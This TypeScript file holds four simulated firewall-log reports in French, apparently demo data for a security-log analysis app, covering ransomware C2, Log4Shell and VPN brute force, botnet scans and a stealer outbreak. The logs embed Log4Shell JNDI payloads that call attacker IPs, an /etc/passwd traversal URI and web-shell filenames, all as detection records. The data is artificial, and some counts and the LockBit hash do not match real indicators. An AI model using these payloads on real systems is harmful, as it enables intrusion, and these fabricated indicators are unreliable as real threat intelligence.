import { SampleReport } from '../types';

export const SAMPLE_REPORTS: SampleReport[] = [
  {
    id: 'ransomware-c2-exfiltration',
    title: 'Alerte Critique : Ransomware C2 & Exfiltration (ATP700)',
    description: 'Balises Cobalt Strike détectées, communication C2 continue et tentative de mouvement latéral interne.',
    device: 'Nebula ATP700 Gateway (Branch-Paris)',
    severity: 'CRITICAL',
    logCount: 18,
    primaryThreat: 'Cobalt Strike C2 Beaconing & Lateral Movement',
    rawLogs: `2026-09-25T08:14:22Z [ATP700] [IDP/IPS] PRIORITY=CRITICAL SIG_ID=1120489 NAME="Trojan.Win32.CobaltStrike.Beacon" PROTO=TCP SRC=192.168.1.105:49182 DST=91.240.118.172:443 ACTION=Dropped HOST="DESKTOP-FINANCE-04" MAC="00:1A:2B:3C:4D:5E"
2026-09-25T08:14:45Z [ATP700] [IP_Reputation] PRIORITY=HIGH CAT="Botnet_C2" SRC=192.168.1.105:49201 DST=91.240.118.172:443 ACTION=Blocked REPUTATION_SCORE=98 COUNTRY="RU"
2026-09-25T08:15:10Z [ATP700] [Anti-Malware] PRIORITY=CRITICAL VIRUS="Win64.Ransomware.LockBit.V3" HASH="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" SRC=91.240.118.172:443 DST=192.168.1.105:49201 ACTION=Quarantined_CDR HOST="DESKTOP-FINANCE-04"
2026-09-25T08:15:33Z [ATP700] [Content_Filter] PRIORITY=HIGH CAT="Malicious_Domain" DOMAIN="update-server-cdn-check.xyz" CLIENT=192.168.1.105 QUERY_TYPE=A ACTION=Blocked
2026-09-25T08:16:01Z [ATP700] [Traffic_Anomaly] PRIORITY=CRITICAL TYPE="DNS_Tunneling" CLIENT=192.168.1.105 DEST=185.220.101.5:53 BYTES_SENT=842000 ACTION=Alerted DETAILS="Base64 encoded subdomains detected"
2026-09-25T08:16:40Z [ATP700] [IDP/IPS] PRIORITY=HIGH SIG_ID=1054112 NAME="MS-RPC Lateral Movement PsExec invocation" PROTO=TCP SRC=192.168.1.105:445 DST=192.168.1.20:445 ACTION=Alerted TARGET_SRV="SRV-DATABASE-01"
2026-09-25T08:17:15Z [ATP700] [IDP/IPS] PRIORITY=CRITICAL SIG_ID=1120489 NAME="Trojan.Win32.CobaltStrike.Beacon" PROTO=TCP SRC=192.168.1.105:49310 DST=194.26.29.112:8443 ACTION=Alerted COUNTRY="NL"
2026-09-25T08:17:42Z [ATP700] [CDR_Quarantine] PRIORITY=CRITICAL EVENT="Collaborative Detection and Response" TARGET_MAC="00:1A:2B:3C:4D:5E" TARGET_IP="192.168.1.105" ACTION="Containment_Recommended" REASON="Multi-threat correlation threshold exceeded"
2026-09-25T08:18:05Z [ATP700] [IP_Reputation] PRIORITY=HIGH CAT="Known_Tor_Exit_Node" SRC=185.220.101.5:41882 DST=192.168.1.20:443 ACTION=Blocked COUNTRY="NL"
2026-09-25T08:18:22Z [ATP700] [IDP/IPS] PRIORITY=HIGH SIG_ID=1089201 NAME="Mimikatz LSASS memory dumper network pattern" PROTO=TCP SRC=192.168.1.105:49411 DST=192.168.1.10:445 ACTION=Alerted TARGET_SRV="SRV-AD-DOMAIN"
2026-09-25T08:19:00Z [ATP700] [IP_Reputation] PRIORITY=CRITICAL CAT="Threat_Intelligence_Feed" SRC=91.240.118.172:443 DST=192.168.1.105:49502 ACTION=Dropped INTEL_SOURCE="Nebula Threat Intelligence Cloud"`
  },
  {
    id: 'log4shell-vpn-bruteforce',
    title: 'Attaque Brute-Force SSL-VPN & Exploitation Log4j CVE-2021-44228',
    description: 'Vague d’assauts automatisés ciblant le portail VPN Nebula et injection JNDI Log4Shell sur serveur Web.',
    device: 'Nebula USG FLEX 500 (HQ-Security)',
    severity: 'CRITICAL',
    logCount: 16,
    primaryThreat: 'Log4Shell RCE & SSL-VPN Credential Stuffing',
    rawLogs: `2026-09-25T09:02:11Z [USG_FLEX] [VPN_Auth] PRIORITY=HIGH MSG="SSL-VPN Authentication Failed" USER="admin" SRC=45.142.122.9:54210 DST=195.154.80.12:4433 REASON="Invalid credentials" ATTEMPTS=84
2026-09-25T09:02:35Z [USG_FLEX] [VPN_Auth] PRIORITY=HIGH MSG="SSL-VPN Authentication Failed" USER="root" SRC=45.142.122.9:54228 DST=195.154.80.12:4433 REASON="Account locked" ATTEMPTS=156
2026-09-25T09:03:02Z [USG_FLEX] [IDP/IPS] PRIORITY=CRITICAL SIG_ID=1120038 NAME="Apache Log4j Remote Code Execution (CVE-2021-44228)" PROTO=TCP SRC=45.142.122.9:43891 DST=192.168.1.80:80 ACTION=Alerted PAYLOAD="\${jndi:ldap://45.142.122.9:1389/Exploit}"
2026-09-25T09:03:15Z [USG_FLEX] [IDP/IPS] PRIORITY=CRITICAL SIG_ID=1120038 NAME="Apache Log4j Remote Code Execution (CVE-2021-44228)" PROTO=TCP SRC=193.106.191.66:39102 DST=192.168.1.80:80 ACTION=Dropped PAYLOAD="\${jndi:dns://193.106.191.66:53/sys}"
2026-09-25T09:03:40Z [USG_FLEX] [IP_Reputation] PRIORITY=CRITICAL CAT="Scanner_Exploit_Tool" SRC=45.142.122.9:443 DST=195.154.80.12:4433 ACTION=Blocked REPUTATION_SCORE=99 COUNTRY="RU"
2026-09-25T09:04:12Z [USG_FLEX] [VPN_Auth] PRIORITY=HIGH MSG="IKEv2 VPN Pre-shared key mismatch" SRC=193.106.191.66:500 DST=195.154.80.12:500 REASON="Potential Aggressive Mode PSK Cracking"
2026-09-25T09:04:45Z [USG_FLEX] [Traffic_Anomaly] PRIORITY=HIGH TYPE="HTTP_Flood_Targeted" SRC=45.142.122.9 DST=192.168.1.80:80 REQ_PER_SEC=450 ACTION=Rate-Limited
2026-09-25T09:05:00Z [USG_FLEX] [IDP/IPS] PRIORITY=HIGH SIG_ID=1072931 NAME="Web Shell Upload Attempt (c99.php / cmd.jsp)" PROTO=TCP SRC=193.106.191.66:44819 DST=192.168.1.80:80 ACTION=Dropped`
  },
  {
    id: 'mirai-synflood-recon',
    title: 'Scan Agressif Botnet & Attaque SYN Flood WAN',
    description: 'Reconnaissance distribuée des ports d’administration (SSH, Telnet, Web) et saturation de la table d’état de la passerelle.',
    device: 'Nebula USG FLEX 200 (Site-Lyon)',
    severity: 'HIGH',
    logCount: 14,
    primaryThreat: 'Botnet Port Reconnaissance & DoS SYN Flood',
    rawLogs: `2026-09-25T07:20:01Z [USG200] [Traffic_Anomaly] PRIORITY=HIGH TYPE="TCP_SYN_Flood" SRC=103.152.18.23 DST=212.83.140.2:80 PACKETS_SEC=12500 ACTION=Dropped
2026-09-25T07:20:15Z [USG200] [IDP/IPS] PRIORITY=HIGH SIG_ID=1039841 NAME="Mirai Botnet Telnet Brute Force" PROTO=TCP SRC=103.152.18.23:44211 DST=212.83.140.2:23 ACTION=Dropped
2026-09-25T07:20:30Z [USG200] [IP_Reputation] PRIORITY=HIGH CAT="Botnet_Infected_Node" SRC=103.152.18.23:51992 DST=212.83.140.2:22 ACTION=Blocked REPUTATION_SCORE=92 COUNTRY="ID"
2026-09-25T07:21:05Z [USG200] [Traffic_Anomaly] PRIORITY=MEDIUM TYPE="Fast_Port_Scan" SRC=195.133.40.71 TARGET_PORTS="21,22,23,80,443,3389,8080,8443" ACTION=Rate-Limited
2026-09-25T07:21:35Z [USG200] [IDP/IPS] PRIORITY=HIGH SIG_ID=1045920 NAME="SSH Brute Force Dictionary Attack" PROTO=TCP SRC=195.133.40.71:55122 DST=212.83.140.2:22 ACTION=Dropped USER_ATTEMPTS="root,ubnt,support,admin"
2026-09-25T07:22:10Z [USG200] [IP_Reputation] PRIORITY=HIGH CAT="Malicious_Host" SRC=80.82.77.139:41920 DST=212.83.140.2:80 ACTION=Blocked COUNTRY="SC"
2026-09-25T07:22:45Z [USG200] [IDP/IPS] PRIORITY=MEDIUM SIG_ID=1067210 NAME="HTTP Directory Traversal /etc/passwd probing" PROTO=TCP SRC=80.82.77.139:41920 DST=212.83.140.2:80 ACTION=Dropped URI="/../../../../etc/passwd"`
  },
  {
    id: 'phishing-stealer-outbreak',
    title: 'Phishing Interne & Téléchargement Payload Stealer',
    description: 'Poste utilisateur ayant cliqué sur un lien malveillant, interception de certificat et fuite d’identifiants.',
    device: 'Nebula ATP500 Gateway (Branch-Bordeaux)',
    severity: 'HIGH',
    logCount: 12,
    primaryThreat: 'InfoStealer Malware Delivery & Credential Harvest',
    rawLogs: `2026-09-25T10:10:05Z [ATP500] [Content_Filter] PRIORITY=HIGH CAT="Phishing_Financial" DOMAIN="nebula-secure-auth-login.com" CLIENT=192.168.1.42 ACTION=Blocked HOST="LAPTOP-SALES-02" MAC="A4:5E:60:E1:92:0B"
2026-09-25T10:10:22Z [ATP500] [Anti-Malware] PRIORITY=HIGH VIRUS="Trojan.Win32.RedLineStealer" HASH="4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945" SRC=179.43.155.22:80 DST=192.168.1.42:51240 ACTION=Quarantined_CDR
2026-09-25T10:10:50Z [ATP500] [IP_Reputation] PRIORITY=HIGH CAT="InfoStealer_C2" SRC=192.168.1.42:51255 DST=179.43.155.22:443 ACTION=Blocked COUNTRY="CH"
2026-09-25T10:11:15Z [ATP500] [CDR_Quarantine] PRIORITY=HIGH EVENT="CDR Client Isolation" TARGET_MAC="A4:5E:60:E1:92:0B" TARGET_IP="192.168.1.42" ACTION="Isolated_to_Quarantine_VLAN" REASON="Anti-Malware positive detection"`
  }
];
